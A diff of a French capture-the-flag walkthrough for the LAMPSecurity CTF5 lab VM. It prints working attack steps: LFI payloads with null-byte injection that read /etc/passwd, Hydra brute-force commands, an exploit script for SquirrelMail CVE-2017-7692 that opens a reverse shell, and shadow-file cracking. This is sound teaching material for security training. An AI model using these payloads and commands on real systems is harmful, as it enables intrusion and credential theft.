@@ -1,28 +1,29 @@
 # LAMPSecurity: CTF5
-[LAMPSecurity](https://sourceforge.net/projects/lampsecurity/) est un projet conçu par [le chercheur en sécurité madirish2600](https://www.vulnhub.com/author/madirish2600,75/), qui nous gratifie d'un ensemble de machines virtuelles volontairement vulnérables. L'objectif est de trouver et d'exploiter des vulnérabilités sur chacune de ces VM, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Ce _walkthrough_ sera consacré à la résolution complète de la cinquième VM de la série, [LAMPSecurity CTF5](https://www.vulnhub.com/entry/lampsecurity-ctf5,84/). Vous voilà prévenus et pour paraphraser [la chaîne YouTube CinemaSins](https://www.youtube.com/channel/UCYUQQgogVeQY8cMQamhHJcg) : spoilers!! (duh..)
+
+[LAMPSecurity](https://sourceforge.net/projects/lampsecurity/) est un projet conçu par le chercheur en sécurité [Justin Klein Keane](https://www.vulnhub.com/author/madirish2600,75/) alias madirish2600, qui nous gratifie d'un ensemble de machines virtuelles volontairement vulnérables. L'objectif est de trouver et d'exploiter des vulnérabilités sur chacune de ces VM, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Ce _walkthrough_ sera consacré à la résolution complète de la cinquième VM de la série, [LAMPSecurity CTF5](https://www.vulnhub.com/entry/lampsecurity-ctf5,84/). Vous voilà prévenus et pour paraphraser [la chaîne YouTube CinemaSins](https://www.youtube.com/channel/UCYUQQgogVeQY8cMQamhHJcg) : spoilers!! (duh..)
 
 ## Recherche d'informations
+
 Avant de dévaliser un magasin ou de s'introduire dans une villa luxueuse, un cambrioleur bien avisé se doit de préparer le terrain en faisant des repérages : il observe et se renseigne non seulement sur sa cible mais également sur le quartier avoisinant, il prend note des allées et venues, des issues possibles (portes/fenêtres/véranda/cheminée...), des systèmes de vidéosurveillance et de tout autre élément qui lui sera utile pour peaufiner son attaque.
   
 En informatique, c'est la même chose. La première phase d'une attaque consiste à récolter un maximum d'informations sur l'environnement cible, grâce à des moteurs de recherche ou à l'aide d'outils de scan. En fonction des éléments trouvés par l'assaillant, il lui sera alors possible d'ajuster ses attaques à venir.
 
-Pour commencer, l'outil [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF5.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF5.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
 
- Currently scanning: Finished!   |   Screen View: Unique Hosts                 
-                                                                               
- 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
- _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
- -----------------------------------------------------------------------------
- 192.168.56.1    01:02:03:04:05:06      1      60  Unknown vendor                    
- 192.168.56.101  08:00:08:00:08:00      1      60  PCS Systemtechnik GmbH
- 192.168.56.102  08:00:80:00:80:00      1      60  PCS Systemtechnik GmbH 
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.56.1    0a:00:27:00:00:10      1      60  Unknown vendor
+192.168.56.101  00:0c:29:44:6b:32      1      60  PCS Systemtechnik GmbH
+192.168.56.102  08:00:27:38:27:38      1      60  PCS Systemtechnik GmbH
 ```
 
-192.168.56.102 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), une distribution Linux basée sur Debian et véritable couteau suisse en matière de sécurité informatique. Par déduction, 192.168.56.101 correspond à l'adresse IP de la VM LAMPSecurity CTF5. À présent, c'est au tour de l'outil [nmap](https://nmap.org/book/man.html#man-description) d'être lancé afin de détecter les ports ouverts sur le serveur CTF5, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
+192.168.56.102 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), une distribution Linux basée sur Debian et véritable couteau suisse en matière de sécurité informatique. Par déduction, 192.168.56.101 correspond à l'adresse IP de la VM LAMPSecurity CTF5. À présent, c'est au tour de l'outil [__nmap__](https://nmap.org/book/man.html#man-description) d'être lancé afin de détecter les ports ouverts sur le serveur CTF5, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.101
@@ -41,7 +42,7 @@ PORT      STATE SERVICE     VERSION
 901/tcp   open  http        Samba SWAT administration server
 3306/tcp  open  mysql       MySQL 5.0.45
 33278/tcp open  status      1 (RPC #100024)
-MAC Address: 08:00:08:00:08:00 (Oracle VirtualBox virtual NIC)
+MAC Address: 00:0c:29:44:6b:32 (Oracle VirtualBox virtual NIC)
 Service Info: Hosts: localhost.localdomain, 192.168.56.101; OS: Unix
 ```
 
@@ -54,14 +55,14 @@ Le serveur Web semble a priori le plus alléchant pour commencer ; voici le site
 ![Affichage de l'image CTF5_pagesWeb.png](images/CTF5_pagesWeb.png)
 
 Il y a tellement de pages, de pistes intéressantes à creuser que l'on ne sait plus où donner de la tête.
-* index.php qui affiche des informations en fonction du paramètre _page_ (about, contact)
-* /list/ un formulaire d'inscription à la mailing-list de Phake Organization
-* /~andy/ le blog _powered by NanoCMS_ d'Andy Carp, le directeur marketing de la société
-* /~andy/data/nanoadmin.php l'interface d'administration du blog NanoCMS
-* /events/ un système de gestion d'événements sous Drupal 
-* /mail un formulaire d'authentification au webmail SquirrelMail version 1.4.11-1.fc8
+* ```index.php``` qui affiche des informations en fonction du paramètre ```page``` (about, contact)
+* ```/list/``` un formulaire d'inscription à la mailing-list de Phake Organization
+* ```/~andy/``` le blog _powered by NanoCMS_ d'Andy Carp, le directeur marketing de la société
+* ```/~andy/data/nanoadmin.php``` l'interface d'administration du blog NanoCMS
+* ```/events/``` un système de gestion d'événements sous Drupal 
+* ```/mail``` un formulaire d'authentification au webmail SquirrelMail version 1.4.11-1.fc8
 
-Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [nikto](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
+Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [__nikto__](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
 
 ```console
 root@blinils:~# nikto -h http://192.168.56.101
@@ -133,7 +134,7 @@ Go go go!
 + /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.
 ```
 
-Dans un premier temps, nikto nous informe qu'une [inclusion de fichier local](http://www.commentcamarche.net/contents/61-attaques-par-manipulation-d-url) (_remote file inclusion_ en anglais) est possible via index.php et son paramètre page. Le but du jeu consiste à lire le contenu de fichiers stockés sur le serveur, autres que ceux initialement prévus dans le schéma de navigation du site. Ainsi, si l'appel des URL http://192.168.56.101/?page=about et http://192.168.56.101/?page=contact affichent respectivement les fichiers about.php et contact.php situés très probablement dans le répertoire /var/www/html, rien n'empêche d'inclure le fichier info.php signalé par nikto avec l'URL http://192.168.56.101/index.php?page=info, n'est-ce pas ?
+Dans un premier temps, __nikto__ nous informe qu'une [inclusion de fichier local](http://www.commentcamarche.net/contents/61-attaques-par-manipulation-d-url) (_remote file inclusion_ en anglais) est possible via ```index.php``` et son paramètre ```page```. Le but du jeu consiste à lire le contenu de fichiers stockés sur le serveur, autres que ceux initialement prévus dans le schéma de navigation du site. Ainsi, si l'appel des URL ```http://192.168.56.101/?page=about``` et ```http://192.168.56.101/?page=contact``` affichent respectivement les fichiers ```about.php``` et ```contact.php``` situés très probablement dans le répertoire ```/var/www/html```, rien n'empêche d'inclure le fichier ```info.php``` signalé par nikto avec l'URL ```http://192.168.56.101/index.php?page=info```, n'est-ce pas ?
 
 ```
 + /info.php: Output from the phpinfo() function was found.
@@ -142,7 +143,7 @@ Dans un premier temps, nikto nous informe qu'une [inclusion de fichier local](ht
 
 ![Affichage de l'image CTF5_LFI1.png](images/CTF5_LFI1.png)
 
-Rectification : les fichiers about.php et contact.php sont situés précisément dans le répertoire /var/www/html/inc. Néanmoins, cette erreur PHP confirme l'existence de la vulnérabilité. Sans connaître exactement le contenu du fichier index.php, il est possible de « reconstituer » la portion de code relative à l'inclusion de fichier. Le code PHP ci-dessous doit s'en approcher fortement... et de toute façon, spoilers, nous en aurons le coeur net lorsque nous nous serons introduits sur le serveur.
+Rectification : les fichiers ```about.php``` et ```contact.php``` sont situés précisément dans le répertoire ```/var/www/html/inc```. Néanmoins, cette erreur PHP confirme l'existence de la vulnérabilité. Sans connaître exactement le contenu du fichier ```index.php```, il est possible de « reconstituer » la portion de code relative à l'inclusion de fichier. Le code PHP ci-dessous doit s'en approcher fortement... et de toute façon, spoilers, nous en aurons le coeur net lorsque nous nous serons introduits sur le serveur.
 
 ```php
 1	<?php
@@ -154,18 +155,18 @@ Rectification : les fichiers about.php et contact.php sont situés précisément
 7	?>
 ```
 
-L'exploitation de cette vulnérabilité consiste, dans un premier temps, à remonter le plus haut possible dans l'arborescence à l'aide du symbole [..](https://www.cs.jhu.edu/~joanne/unix.html) synonyme de « répertoire parent ». Ensuite, il faut cibler un fichier intéressant, par exemple /etc/passwd qui contient la liste des utilisateurs Unix. Mais il y a un couac ! En effet, l'URL /index.php?page=../../../../../../../../../../etc/passwd proposée par nikto ne permet pas de récupérer le fichier, car le code PHP à la ligne 6 ajoute l'extension .php lors de l'inclusion. Une erreur apparaît alors, car le fichier /etc/passwd.php n'existe pas !
+L'exploitation de cette vulnérabilité consiste, dans un premier temps, à remonter le plus haut possible dans l'arborescence à l'aide du symbole [..](https://www.cs.jhu.edu/~joanne/unix.html) synonyme de « répertoire parent ». Ensuite, il faut cibler un fichier intéressant, par exemple ```/etc/passwd``` qui contient la liste des utilisateurs Unix. Mais il y a un couac ! En effet, l'URL ```/index.php?page=../../../../../etc/passwd``` proposée par nikto ne permet pas de récupérer le fichier, car le code PHP à la ligne 6 ajoute l'extension ```.php``` lors de l'inclusion. Une erreur apparaît alors, car le fichier ```/etc/passwd.php``` n'existe pas !
 
 ```
 Warning: include_once(inc/../../../../../../../../../../etc/passwd.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
 Warning: include_once() [function.include]: Failed opening 'inc/../../../../../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/index.php on line 6
 ```
 
-Fort heureusement — ou malheureusement, tout dépend si l'on adopte le point de vue de l'attaquant ou du défenseur — il existe une astuce pour contrecarrer l'ajout de l'extension .php : l'injection d'un octet nul (_[null byte injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection)_ en anglais). Pour faire simple, tout ce qui se trouve après l'octet nul %00 n'est pas pris en compte ; ainsi, l'URL /index.php?page=../../../../../../../../../../etc/passwd%00 appellera le fichier /etc/passwd%00.png, soit /etc/passwd. Le résultat est bien celui escompté.
+Fort heureusement — ou malheureusement, tout dépend si l'on adopte le point de vue de l'attaquant ou du défenseur — il existe une astuce pour contrecarrer l'ajout de l'extension .php : l'injection d'un octet nul ([_null byte injection_](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection) en anglais). Pour faire simple, tout ce qui se trouve après l'octet nul ```%00``` n'est pas pris en compte ; ainsi, l'URL ```/index.php?page=../../../../../etc/passwd%00``` appellera le fichier ```/etc/passwd%00.png```, soit ```/etc/passwd```. Le résultat est bien celui escompté.
 
 ![Affichage de l'image CTF5_LFI2.png](images/CTF5_LFI2.png)
 
-Outre les logins habituels (root, bin, daemon, apache, mysql...), cinq utilisateurs sont particulièrement intéressants : patrick, jennifer, andy, loren et amy. La prochaine étape logique sera de trouver le mot de passe de chacun d'entre eux, puis de se connecter avec leur compte en SSH. Mais avant cela, il y a d'autres pistes potentiellement intéressantes, remontées par nikto, à analyser.
+Outre les logins habituels (root, bin, daemon, apache, mysql...), cinq utilisateurs sont particulièrement intéressants : ```patrick```, ```jennifer```, ```andy```, ```loren``` et ```amy```. La prochaine étape logique sera de trouver le mot de passe de chacun d'entre eux, puis de se connecter avec leur compte en SSH. Mais avant cela, il y a d'autres pistes potentiellement intéressantes, remontées par nikto, à analyser.
 
 ### Présence de phpMyAdmin
 
@@ -179,16 +180,15 @@ msf > search phpmyadmin
 Matching Modules
 ================
 
-   Name                                                  Disclosure Date  Rank       Description
-   ----                                                  ---------------  ----       -----------
-   auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     Telpho10 Backup Credentials Dumper
-   exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
-   exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
-   exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  Zpanel Remote Unauthenticated RCE
-   exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  PhpMyAdmin Config File Code Injection
+Name                                                  Disclosure Date  Rank       Description
+----                                                  ---------------  ----       -----------
+auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     Telpho10 Backup Credentials Dumper
+exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
+exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
+exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  Zpanel Remote Unauthenticated RCE
+exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  PhpMyAdmin Config File Code Injection
 
 
-   
 msf > use exploit/unix/webapp/phpmyadmin_config
 msf exploit(unix/webapp/phpmyadmin_config) > show options
 
@@ -203,7 +203,6 @@ Module options (exploit/unix/webapp/phpmyadmin_config):
    URI      /phpMyAdmin/     yes       Base phpMyAdmin directory path
    VHOST                     no        HTTP server virtual host
 
-
 Exploit target:
 
    Id  Name
@@ -211,13 +210,11 @@ Exploit target:
    0   Automatic (phpMyAdmin 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1)
 ```
 
-Argh! Cet exploit n'est pas valable pour la version de phpMyAdmin installée sur le serveur LampSecurity CTF5... et les deux autres exploits listés non plus. Next!
+Argh! Cet exploit n'est pas valable pour la version de phpMyAdmin installée sur le serveur LAMPSecurity CTF5... et les deux autres exploits listés non plus. Next!
 
 ### SquirrelMail - Attaque par dictionnaire
 
-Le webmail SquirrelMail est également présent sur le serveur, dans sa version 1.4.11-1.fc8... et visiblement, 
-[il y a eu du rififi](https://lists.fedoraproject.org/pipermail/test/2007-December/064683.html) ~~et Loulou~~ avec cette version. 
-La [CVE-2007-6348](https://nvd.nist.gov/vuln/detail/CVE-2007-6348) décrit la vulnérabilité comme suit : « _SquirrelMail 1.4.11 and 1.4.12, as distributed on sourceforge.net before 20071213, has been externally modified to create a Trojan Horse that introduces a PHP remote file inclusion vulnerability, which allows remote attackers to execute arbitrary code_ ».
+Le webmail SquirrelMail est également présent sur le serveur, dans sa version 1.4.11-1.fc8... et visiblement, [il y a eu du rififi](https://lists.fedoraproject.org/pipermail/test/2007-December/064683.html) ~~et Loulou~~ avec cette version. La [CVE-2007-6348](https://nvd.nist.gov/vuln/detail/CVE-2007-6348) décrit la vulnérabilité comme suit : « _SquirrelMail 1.4.11 and 1.4.12, as distributed on sourceforge.net before 20071213, has been externally modified to create a Trojan Horse that introduces a PHP remote file inclusion vulnerability, which allows remote attackers to execute arbitrary code_ ».
 
 * [Re: SECURITY: 1.4.12 Package Compromise](https://lwn.net/Articles/262691/)
 * [SquirrelMail 1.4.13 Released](http://jon.netdork.net/2007/12/14/squirrelmail-1413-released/)
@@ -226,7 +223,7 @@ La [CVE-2007-6348](https://nvd.nist.gov/vuln/detail/CVE-2007-6348) décrit la vu
 * [squirrelmail 1.4.11 and 1.4.12 are compromised](https://lists.fedoraproject.org/pipermail/test/2007-December/064683.html)
 * [What's interesting to me about SquirrelMail attack](http://www.syntaxpolice.org/2007/12/)
 
-De plus, les exploits répertoriés sur [The Exploit Database](https://www.exploit-db.com/search/?action=search&q=SquirrelMail) ne manquent pas, mais la plupart d'entre eux nécessitent un accès authentifié et ne sont pas applicables pour la version 1.4.11. Cinq utilisateurs ont été trouvés grâce à la _Local File Inclusion_ d'index.php, autant se focaliser sur eux et essayer de trouver leur mot de passe. Le wiki [SkullSecurity](https://wiki.skullsecurity.org/Passwords) propose un large panel de dictionnaires : le premier à être utilisé (au nom particulièrement évocateur) est 500-worst-passwords.txt.
+De plus, les exploits répertoriés sur [_The Exploit Database_](https://www.exploit-db.com/search/?action=search&q=SquirrelMail) ne manquent pas, mais la plupart d'entre eux nécessitent un accès authentifié et ne sont pas applicables pour la version 1.4.11. Cinq utilisateurs ont été trouvés grâce à la _Local File Inclusion_ du fichier ```index.php```, autant se focaliser sur eux et essayer de trouver leur mot de passe. Le wiki [SkullSecurity](https://wiki.skullsecurity.org/Passwords) propose un large panel de dictionnaires : le premier à être utilisé (au nom particulièrement évocateur) est ```500-worst-passwords.txt```.
 
 ```console
 root@blinils:~# hydra -l amy -P /usr/share/dict/500-worst-passwords.txt 192.168.56.101 http-post-form 
@@ -239,11 +236,6 @@ root@blinils:~# hydra -l amy -P /usr/share/dict/500-worst-passwords.txt 192.168.
 [ATTEMPT] target 192.168.56.101 - login "amy" - pass "12345678" - 3 of 500 [child 2] (0/0)
 [ATTEMPT] target 192.168.56.101 - login "amy" - pass "1234" - 4 of 500 [child 3] (0/0)
 [ATTEMPT] target 192.168.56.101 - login "amy" - pass "pussy" - 5 of 500 [child 4] (0/0)
-[ATTEMPT] target 192.168.56.101 - login "amy" - pass "12345" - 6 of 500 [child 5] (0/0)
-[ATTEMPT] target 192.168.56.101 - login "amy" - pass "dragon" - 7 of 500 [child 6] (0/0)
-[ATTEMPT] target 192.168.56.101 - login "amy" - pass "qwerty" - 8 of 500 [child 7] (0/0)
-[ATTEMPT] target 192.168.56.101 - login "amy" - pass "696969" - 9 of 500 [child 8] (0/0)
-[ATTEMPT] target 192.168.56.101 - login "amy" - pass "mustang" - 10 of 500 [child 9] (0/0)
 --snip--
 [ATTEMPT] target 192.168.56.101 - login "amy" - pass "sandra" - 360 of 500 [child 8] (0/0)
 [ATTEMPT] target 192.168.56.101 - login "amy" - pass "pookie" - 361 of 500 [child 5] (0/0)
@@ -257,7 +249,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-01-02 03:04:05
 
 ### SquirrelMail - Exploitation de la CVE-2017-7692
 
-La connexion au Webmail est possible grâce au couple d'identifiants amy/dolphins trouvé auparavant.
+La connexion au Webmail est possible grâce au couple d'identifiants ```amy:dolphins``` trouvé auparavant.
 
 ![Affichage de l'image CTF5_Squirrel1.png](images/CTF5_Squirrel1.png)
 
@@ -269,17 +261,20 @@ Parmi la liste d'exploits disponibles pour SquirrelMail, un seul d'entre eux sem
 
 ```console
 root@blinils:~# searchsploit squirrelmail | grep 1.4
-
-SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting                                      | exploits/php/webapps/26305.txt
-SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                                                       | exploits/php/webapps/24068.txt
-SquirrelMail 3.1 - Change Passwd Plugin Local Buffer Overflow                                               | exploits/linux/local/1449.c
-SquirrelMail < 1.4.22 - Remote Code Execution                                                               | exploits/linux/remote/41910.sh
-SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                                                     | exploits/php/webapps/43830.txt
-SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite                                                         | exploits/php/webapps/43839.txt
-Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                                                    | exploits/php/webapps/27948.txt
+ ---------------------------------------------------------------------------------- 
+| Exploit Title                                                                    |
+ ---------------------------------------------------------------------------------- 
+| SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting           |
+| SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                            |
+| SquirrelMail 3.1 - Change Passwd Plugin Local Buffer Overflow                    |
+| SquirrelMail < 1.4.22 - Remote Code Execution                                    |
+| SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                          |
+| SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite                              |
+| Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                         |
+ ---------------------------------------------------------------------------------- 
 ```
 
-La CVE-2017-7692 [a parfaitement été décrite ici](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html) par le concepteur de l'exploit, [Dawid Golunski](https://twitter.com/dawid_golunski) ; inutile donc de paraphraser, toutes les informations se trouvent sur son site LegalHackers. Grâce au couple d'identifiants amy/dolphins trouvé auparavant, un reverse-shell sera créé lors de l'exécution de l'exploit.
+La CVE-2017-7692 [a parfaitement été décrite ici](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html) par le concepteur de l'exploit, [Dawid Golunski](https://twitter.com/dawid_golunski) ; inutile donc de paraphraser, toutes les informations se trouvent sur son site LegalHackers. Grâce au couple d'identifiants ```amy:dolphins``` trouvé auparavant, un _reverse shell_ sera créé lors de l'exécution de l'exploit.
 
 ```console
 root@blinils:~# cp /usr/share/exploitdb/exploits/linux/remote/41910.sh .
@@ -290,7 +285,7 @@ bash: ./41910.sh: /bin/bash^M: bad interpreter: No such file or directory
 root@blinils:~# sed -i -e 's/\r$//' 41910.sh
 root@blinils:~# ./41910.sh http://192.168.56.101/mail/
 
---snip--                                                  
+--snip--
 SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
 
 SquirrelMail_RCE_exploit.sh (ver. 1.0)
@@ -351,7 +346,7 @@ webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
 bash-3.2$
 ```
 
-Un shell a été obtenu sur le serveur ! Le « mail-exploit » se situe quant à lui dans le dossier Sent d'Amy.
+Un shell a été obtenu sur le serveur ! Le « mail-exploit » se situe quant à lui dans le dossier ```Sent``` d'Amy.
 
 ![Affichage de l'image CTF5_Squirrel3.png](images/CTF5_Squirrel3.png)
 
@@ -376,25 +371,25 @@ exit
 [*] All done. Exiting
 ```
 
-La recherche a porté ses fruits, le premier fichier trouvé /home/andy/public_html/data/pagesdata.txt semble particulièrement intéressant. 
+La recherche a porté ses fruits, le premier fichier trouvé ```/home/andy/public_html/data/pagesdata.txt``` semble particulièrement intéressant. 
 
 ### NanoCMS '/data/pagesdata.txt' Password Hash Information Disclosure Vulnerability
 
-Au vu de l'emplacement du fichier pagesdata.txt (public_html), celui-ci est accessible dans l'arborescence du blog d'andy (donc, dans un navigateur).
+Au vu de l'emplacement du fichier ```pagesdata.txt``` (public_html), celui-ci est accessible dans l'arborescence du blog d'andy (donc, dans un navigateur).
 
 Une vulnérabilité [a été trouvée en 2009](https://www.securityfocus.com/bid/34508/discuss) sur le système de gestion de contenu
-[NanoCMS](https://github.com/kalyan02/NanoCMS) : « _NanoCMS is prone to an information-disclosure vulnerability because it fails to validate access to sensitive files. An attacker can exploit this vulnerability to obtain sensitive information that may lead to further attacks_ ». Fait amusant, celui qui a découvert cette vulnérabilité n'est autre que Justin C. Klein Keane, alias [madirish2600](https://www.vulnhub.com/author/madirish2600,75/), le concepteur du challenge LampSecurity.
+[NanoCMS](https://github.com/kalyan02/NanoCMS) : « _NanoCMS is prone to an information-disclosure vulnerability because it fails to validate access to sensitive files. An attacker can exploit this vulnerability to obtain sensitive information that may lead to further attacks_ ». Fait amusant, celui qui a découvert cette vulnérabilité n'est autre que Justin C. Klein Keane, alias [madirish2600](https://www.vulnhub.com/author/madirish2600,75/), le concepteur du challenge LAMPSecurity.
 
-En effet, ce fichier semble stocker le hash MD5 du mot de passe de l'utilisateur admin, et est en outre accessible sans aucune authentification sur le site.
+En effet, ce fichier semble stocker le hash MD5 du mot de passe de l'utilisateur ```admin```, et est en outre accessible sans aucune authentification sur le site.
 
 ![Affichage de l'image CTF5_NanoCMS1.png](images/CTF5_NanoCMS1.png)
 
-Une brève recherche sur Internet nous donne le mot de passe en clair : shannon.
+Une brève recherche sur Internet nous donne le mot de passe en clair : ```shannon```.
 Il est désormais possible de se connecter au panel d'administration du blog d'Andy.
 
 ![Affichage de l'image CTF5_NanoCMS2.png](images/CTF5_NanoCMS2.png)
 
-Outre cette vulnérabilité, madirish2600 a trouvé d'autres problèmes [au cours d'un audit plus complet](http://seclists.org/fulldisclosure/2009/Apr/126) de NanoCMS : entre autres, des droits de lecture et d'écriture trop permissifs dans certains répertoires, un couple d'identifiants par défaut admin/demo (qui n'a cependant pas fonctionné sur le serveur LampSecurity CTF5), des Cross-Site Scripting explicitées plus bas et surtout, [la possibilité d'injecter du code PHP un peu partout sur le site](https://www.exploit-db.com/papers/12885/) (en anglais, _Remote Code Execution_ ou RCE).
+Outre cette vulnérabilité, madirish2600 a trouvé d'autres problèmes [au cours d'un audit plus complet](http://seclists.org/fulldisclosure/2009/Apr/126) de NanoCMS : entre autres, des droits de lecture et d'écriture trop permissifs dans certains répertoires, un couple d'identifiants par défaut ```admin:demo``` (qui n'a cependant pas fonctionné sur le serveur LAMPSecurity CTF5), des _Cross-Site Scripting_ explicitées plus bas et surtout, [la possibilité d'injecter du code PHP un peu partout sur le site](https://www.exploit-db.com/papers/12885/) (en anglais, _Remote Code Execution_ ou RCE).
 
 Une fois connecté en tant qu'administrateur sur NanoCMS, il est désormais possible de modifier le contenu du blog.
 
@@ -414,11 +409,11 @@ C'est cool d'avoir un shell, mais ce serait tout de même bien mieux avec un aut
 
 ### Attaque par dictionnaire avec Hydra sur SSH, partie 1
 
-Pour rappel, cinq comptes Unix disposant d'un shell valide (/bin/bash) ont été trouvés dans le fichier /etc/passwd.
+Pour rappel, cinq comptes Unix disposant d'un shell valide ```/bin/bash``` ont été trouvés dans le fichier ```/etc/passwd```.
 
 Pour trouver les mots de passe de Patrick, de Jennifer, d'Andy, de Loren et d'Amy, [plusieurs techniques sont possibles](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) : [les attaques par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consistent à tester, de manière exhaustive, toutes les combinaisons possibles ; [les attaques par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking) qui consistent à tester un sous-ensemble de mots ou de combinaisons placés dans un fichier texte ; ou bien [les attaques par social engineering](https://en.wikipedia.org/wiki/Social_engineering_(security)), qui visent à accéder à des informations confidentielles par la manipulation de personnes.
 
-L'attaque par dictionnaire avait plutôt bien fonctionné sur SquirrelMail, donc autant réutiliser l'outil-couteau-suisse Hydra.
+L'attaque par dictionnaire avait plutôt bien fonctionné sur SquirrelMail, donc autant réutiliser l'outil-couteau-suisse [__Hydra__](http://sectools.org/tool/hydra/).
 
 ```console
 root@blinils:~# cat usersCTF5.txt
@@ -477,28 +472,19 @@ Sorry, user amy may not run sudo on localhost.
 /home/patrick/.tomboy.log:70:12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
 ```
 
-Wouhou! Patrick semble avoir sauvegardé le mot de passe root dans Tomboy, un logiciel libre de prise de notes.
+Wouhou! Patrick semble avoir sauvegardé le mot de passe ```root``` dans Tomboy, un logiciel libre de prise de notes.
 
 ```console
 [amy@localhost ~]$ cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note
 
-<?xml version="1.0" encoding="utf-8"?>
-<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
+--snip--
   <title>Root password</title>
   <text xml:space="preserve"><note-content version="0.1">Root password
 
 Root password
 
 50$cent</note-content></text>
-  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
-  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
-  <cursor-position>15</cursor-position>
-  <width>450</width>
-  <height>360</height>
-  <x>0</x>
-  <y>0</y>
-  <open-on-startup>False</open-on-startup>
-</note>
+--snip--
 
 [amy@localhost ~]$ su -
 Password: 
@@ -509,7 +495,7 @@ Password:
 
 ### Attaque par dictionnaire avec Hydra sur SSH, partie 2
 
-Il s'agit de la même attaque, mais avec [le dictionnaire de John The Ripper](http://openwall.com/john/) cette fois-ci.
+Il s'agit de la même attaque, mais avec [le dictionnaire de __John The Ripper__](http://openwall.com/john/) cette fois-ci.
 
 Au bout d'une heure et demie, les résultats sont bien plus probants : les mots de passe de Patrick et de Jennifer ont été trouvés.
 
@@ -527,9 +513,8 @@ root@blinils:~# hydra -L usersCTF5.txt -P /usr/share/dict/john.txt 192.168.56.10
 
 ### Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow
 
-En parallèle de l'attaque avec Hydra, les investigations continuent avec le compte root. Le fichier /etc/shadow est particulièrement intéressant, car 
-[il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
-L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...
+En parallèle de l'attaque avec Hydra, les investigations continuent avec le compte root. Le fichier ```/etc/shadow``` est particulièrement intéressant, car 
